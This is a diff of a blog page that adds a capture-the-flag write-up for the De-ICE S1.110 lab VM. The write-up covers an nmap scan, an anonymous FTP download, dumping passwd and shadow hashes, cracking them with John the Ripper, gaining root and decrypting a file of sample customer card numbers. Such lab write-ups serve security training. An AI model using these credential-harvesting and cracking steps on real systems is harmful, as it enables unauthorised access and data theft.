@@ -9,19 +9,12 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: De-ICE: S1.100 The output from nmap: 1
+  <meta name="description" content="Image: De-ICE: S1.110 Nmap output: 1
 2
 3
 4
-5
-6
-7
-8
-9
-10
-PORT STATE SERVICE VERSION
-20/tcp closed ftp-data
-21/tcp open ftp vsftpd (broken: &hellip;">
+21/tcp open ftp vsftpd 2.0.4
+22/tcp filtered ssh 80/tcp open http Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -90,6 +83,250 @@ PORT STATE SERVICE VERSION
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/10/de-ice-s1-dot-110/">DE-ICE-S1.110</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-10T00:01:04+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:01 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE: S1.110</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open     ftp     vsftpd 2.0.4
+</span><span class='line'>22/tcp  filtered ssh 
+</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+</span><span class='line'>631/tcp open     ipp     CUPS 1.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>FTP anonymous login is allowed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r ftp://ftp@192.168.1.110:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have found a few files, but nothing particularly interesting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
+</span><span class='line'>SYSTEM:*:18:544:,S-1-5-18::
+</span><span class='line'>Administrators:*:544:544:,S-1-5-32-544::
+</span><span class='line'>Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
+</span><span class='line'>Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
+</span><span class='line'>Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
+</span><span class='line'>__vmware_user__:unused_by_nt/2000/xp:1002:513:__vmware_user__,U-Tom-PC\__vmware_user__,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/__vmware_user__:/bin/bash
+</span><span class='line'>
+</span><span class='line'>root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
+</span><span class='line'>root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>
+</span><span class='line'>toor             (root)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>More about cygwin format <a href="https://cygwin.com/cygwin-ug-net/ntsec.html">here</a>.</p>
+
+<p>In /etc directory, there is a core file which contains password hashes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
+</span><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After adjusting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
+</span><span class='line'>bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
+</span><span class='line'>ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ john ~/DE-ICE-S1.110/crackme.john --wordlist="/root/darkc0de.lst"
+</span><span class='line'>Complexity       (root)
+</span><span class='line'>Zymurgy          (bbanter)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in as user bbanter and obtain root permissions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bbanter@slax:/$ su root
+</span><span class='line'>Password: **********
+</span><span class='line'>root@slax:/# id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lastly, we check the backup file and decrypt CSV:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/root/.save# cat copy.sh
+</span><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'><span class="c">#encrypt files in ftp/incoming</span>
+</span><span class='line'>openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/<span class="nv">$1</span> -out /home/root/.save/<span class="nv">$1</span>.enc -pass file:/etc/ssl/certs/pw
+</span><span class='line'><span class="c">#remove old file</span>
+</span><span class='line'>rm /home/ftp/incoming/<span class="nv">$1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# cat /etc/ssl/certs/pw
+</span><span class='line'>d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
+</span><span class='line'>"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
+</span><span class='line'>1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
+</span><span class='line'>1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
+</span><span class='line'>1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
+</span><span class='line'>1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
+</span><span class='line'>1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
+</span><span class='line'>1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
